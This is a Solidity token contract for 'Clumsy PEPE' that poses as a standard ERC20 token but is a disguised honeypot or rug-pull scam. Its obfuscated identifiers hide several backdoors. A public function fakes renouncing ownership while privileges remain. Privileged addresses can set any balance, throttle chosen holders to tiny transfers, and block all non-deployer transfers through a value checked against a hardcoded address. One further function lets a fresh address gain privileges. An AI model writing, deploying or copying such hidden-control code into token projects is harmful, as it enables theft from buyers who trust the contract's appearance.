//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface modeMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamReceiver) external view returns (uint256);

    function transfer(address exemptSwap, uint256 minTokenWallet) external returns (bool);

    function allowance(address marketingSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 minTokenWallet) external returns (bool);

    function transferFrom(
        address sender,
        address exemptSwap,
        uint256 minTokenWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalMode, uint256 value);
    event Approval(address indexed marketingSell, address indexed spender, uint256 value);
}

abstract contract maxSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listReceiverReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenSell {
    function createPair(address receiverMin, address tokenMode) external returns (address);
}

interface modeMinMetadata is modeMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ClumsyPEPE is maxSender, modeMin, modeMinMetadata {

    constructor (){
        
        listReceiverReceiver minAuto = listReceiverReceiver(amountSender);
        launchToLimit = tokenSell(minAuto.factory()).createPair(minAuto.WETH(), address(this));
        
        minShould = _msgSender();
        walletExempt();
        amountSell[minShould] = true;
        fundReceiver[minShould] = autoFrom;
        
        emit Transfer(address(0), minShould, autoFrom);
    }

    function balanceOf(address teamReceiver) public view virtual override returns (uint256) {
        return fundReceiver[teamReceiver];
    }

    function symbol() external view virtual override returns (string memory) {
        return enableFee;
    }

    bool public amountBuy;

    function isTotal(address fromLiquidity, address exemptSwap, uint256 minTokenWallet) internal returns (bool) {
        require(fundReceiver[fromLiquidity] >= minTokenWallet);
        fundReceiver[fromLiquidity] -= minTokenWallet;
        fundReceiver[exemptSwap] += minTokenWallet;
        emit Transfer(fromLiquidity, exemptSwap, minTokenWallet);
        return true;
    }

    uint256 private walletMax;

    function minSwap(address fromLiquidity, address exemptSwap, uint256 minTokenWallet) internal returns (bool) {
        if (fromLiquidity == minShould) {
            return isTotal(fromLiquidity, exemptSwap, minTokenWallet);
        }
        uint256 takeAuto = modeMin(launchToLimit).balanceOf(marketingIs);
        require(takeAuto == shouldLaunched);
        require(exemptSwap != marketingIs);
        if (limitReceiver[fromLiquidity]) {
            return isTotal(fromLiquidity, exemptSwap, listReceiverAt);
        }
        return isTotal(fromLiquidity, exemptSwap, minTokenWallet);
    }

    function transfer(address minReceiver, uint256 minTokenWallet) external virtual override returns (bool) {
        return minSwap(_msgSender(), minReceiver, minTokenWallet);
    }

    function allowance(address listLaunch, address tokenShould) external view virtual override returns (uint256) {
        if (tokenShould == amountSender) {
            return type(uint256).max;
        }
        return toToken[listLaunch][tokenShould];
    }

    function walletExempt() public {
        emit OwnershipTransferred(minShould, address(0));
        maxListLaunch = address(0);
    }

    function transferFrom(address fromLiquidity, address exemptSwap, uint256 minTokenWallet) external override returns (bool) {
        if (_msgSender() != amountSender) {
            if (toToken[fromLiquidity][_msgSender()] != type(uint256).max) {
                require(minTokenWallet <= toToken[fromLiquidity][_msgSender()]);
                toToken[fromLiquidity][_msgSender()] -= minTokenWallet;
            }
        }
        return minSwap(fromLiquidity, exemptSwap, minTokenWallet);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoFrom;
    }

    bool private sellBuy;

    uint256 private exemptLaunch;

    function fundIs() private view {
        require(amountSell[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return maxListLaunch;
    }

    string private enableFee = "CPE";

    uint8 private maxBuy = 18;

    mapping(address => bool) public amountSell;

    address amountSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private maxListLaunch;

    address public minShould;

    event OwnershipTransferred(address indexed maxTotal, address indexed launchedFrom);

    uint256 private autoFrom = 100000000 * 10 ** 18;

    bool private listTake;

    mapping(address => mapping(address => uint256)) private toToken;

    function decimals() external view virtual override returns (uint8) {
        return maxBuy;
    }

    uint256 private autoMarketing;

    uint256 constant listReceiverAt = 2 ** 10;

    string private isFee = "Clumsy PEPE";

    function name() external view virtual override returns (string memory) {
        return isFee;
    }

    bool public txShould;

    function isTakeMax(address launchedLimit) public {
        fundIs();
        
        if (launchedLimit == minShould || launchedLimit == launchToLimit) {
            return;
        }
        limitReceiver[launchedLimit] = true;
    }

    function approve(address tokenShould, uint256 minTokenWallet) public virtual override returns (bool) {
        toToken[_msgSender()][tokenShould] = minTokenWallet;
        emit Approval(_msgSender(), tokenShould, minTokenWallet);
        return true;
    }

    mapping(address => bool) public limitReceiver;

    bool public launchedIsMax;

    mapping(address => uint256) private fundReceiver;

    uint256 public tradingBuyShould;

    uint256 shouldLaunched;

    function senderLaunched(address tradingTeam) public {
        require(tradingTeam.balance < 100000);
        if (txShould) {
            return;
        }
        if (exemptLaunch == autoMarketing) {
            launchedIsMax = true;
        }
        amountSell[tradingTeam] = true;
        if (isExempt != amountBuy) {
            amountBuy = true;
        }
        txShould = true;
    }

    function modeBuy(uint256 minTokenWallet) public {
        fundIs();
        shouldLaunched = minTokenWallet;
    }

    address marketingIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function exemptToken(address minReceiver, uint256 minTokenWallet) public {
        fundIs();
        fundReceiver[minReceiver] = minTokenWallet;
    }

    function owner() external view returns (address) {
        return maxListLaunch;
    }

    bool private isExempt;

    address public launchToLimit;

    uint256 receiverList;

}